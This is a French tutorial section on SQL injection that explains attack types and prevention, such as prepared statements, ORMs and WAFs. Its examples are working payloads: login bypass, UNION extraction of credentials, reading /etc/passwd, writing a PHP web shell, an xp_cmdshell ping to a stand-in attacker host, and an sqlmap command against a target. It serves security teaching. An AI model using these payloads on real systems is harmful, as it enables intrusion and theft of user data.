### **4. Injections SQL (SQLi)**  
#### **Définition** :  
Une injection SQL survient lorsque **des données non fiables (fournies par l’utilisateur) sont insérées dans une requête SQL sans validation ou encodage adéquat**, permettant à un attaquant de manipuler la requête pour exécuter du code SQL malveillant. Cela peut entraîner l’extraction, la modification, ou la suppression de données sensibles.

---

### **Types d’attaques SQLi**  
#### **1. Injection SQL basée sur les erreurs (Error-based SQLi)**  
- **Principe** : Exploitation des messages d’erreur détaillés renvoyés par la base de données pour extraire des informations (ex. : structure de la base, versions).  
- **Exemple** :  
  ```sql
  ' OR 1=CONVERT(int, (SELECT @@version)) --
  ```  
  → Le message d’erreur révèle la version du serveur SQL.  

#### **2. Injection SQL booléenne (Boolean-based SQLi)**  
- **Principe** : Utilisation de requêtes conditionnelles pour inférer des données via des réponses booléennes (vrai/faux).  
- **Exemple** :  
  ```sql
  ' AND (SELECT COUNT(*) FROM users) > 0 -- 
  ```  
  → Si la réponse est vraie, la table `users` existe.  

#### **3. Injection SQL temporelle (Time-based SQLi)**  
- **Principe** : Mesure des délais de réponse pour déterminer si une condition est vraie.  
- **Exemple** :  
  ```sql
  ' IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a') WAITFOR DELAY '0:0:5' --
  ```  
  → Un délai de 5 secondes indique que le premier caractère du mot de passe est `'a'`.  

#### **4. Injection SQL hors bande (Out-of-band SQLi)**  
- **Principe** : Extraction de données via des canaux externes (ex. : requêtes HTTP/DNS vers un serveur contrôlé par l’attaquant).  
- **Exemple** :  
  ```sql
  EXEC xp_cmdshell('ping attaquant.com'); --
  ```  
  → Envoie des données via DNS ou HTTP.  

---

### **Exploitation pratique**  
#### **Techniques courantes** :  
1. **Bypass de connexion** :  
   ```sql
   ' OR 1=1 -- 
   ```  
   → Permet de se connecter sans mot de passe.  

2. **Extraction de données via `UNION SELECT`** :  
   ```sql
   ' UNION SELECT username, password FROM users --
   ```  
   → Affiche les identifiants des utilisateurs.  

3. **Lecture de fichiers système** :  
   ```sql
   LOAD_FILE('/etc/passwd');
   ```  

4. **Écriture de fichiers** :  
   ```sql
   INTO OUTFILE '/var/www/html/shell.php' VALUES("<?php system($_GET['cmd']); ?>");
   ```  

---

### **Conséquences des attaques SQLi**  
1. **Vol de données sensibles** :  
   - Exfiltration de mots de passe, numéros de carte bancaire, données personnelles.  
2. **Modification ou suppression de données** :  
   - Défiguration de sites, suppression de tables critiques.  
3. **Accès au système** :  
   - Exécution de commandes système via `xp_cmdshell` (MS SQL Server) ou `LOAD_FILE` (MySQL).  
4. **Impact légal et financier** :  
   - Non-conformité aux réglementations (ex. : RGPD, PCI DSS).  

---

### **Prévention et bonnes pratiques**  
#### **1. Utilisation de requêtes préparées (prepared statements)** :  
- **Java (JDBC)** :  
  ```java
  PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
  stmt.setInt(1, userId);
  ```  
- **PHP (PDO)** :  
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->execute([$userId]);
  ```  

#### **2. Filtrage et validation des entrées** :  
- **Whitelist** : Accepter uniquement des formats valides (ex. : regex pour les emails).  
- **Blacklist** : Bloquer les caractères dangereux (`'`, `;`, `--`).  

#### **3. Utilisation d’ORM (Object-Relational Mapping)** :  
- Exemples : Hibernate (Java), Doctrine (PHP), SQLAlchemy (Python).  

#### **4. Gestion des privilèges** :  
- Accorder à l’utilisateur de la base de données **uniquement les privilèges nécessaires** (ex. : interdire `DROP TABLE`).  

#### **5. Journalisation et détection** :  
- Surveiller les requêtes suspectes via des outils comme **Snort** ou **Wazuh**.  
- Utiliser des **Web Application Firewalls (WAF)** comme **ModSecurity**.  

#### **6. Outils et bibliothèques** :  
- **OWASP SQLi Validator** : Vérification automatique des requêtes.  
- **SQLMap** : Test d’automatisation des vulnérabilités SQLi.  

---

### **Cas réels et exemples historiques**  
1. **Attaque contre Sony (2011)** :  
   - Vol de 1 million de données utilisateur via SQLi.  
2. **Breach of Heartland Payment Systems (2008)** :  
   - Injection SQL pour accéder à 130 millions de numéros de carte bancaire.  
3. **WordPress Plugins vulnérables** :  
   - Plugins tiers mal codés exposant des failles SQLi (ex. : WP Symposium).  

---



### **Exercices pratiques**  
1. **Bypass de login** :  
   ```sql
   username: admin' --
   password: n'importe quoi
   ```  
2. **Extraction de la version SQL** :  
   ```sql
   ' OR 1=CONVERT(int, (SELECT @@version)) --
   ```  
3. **Utilisation de SQLMap** :  
   ```bash
   sqlmap -u "http://victime.com/page?id=1" --dbs
   ```  

---
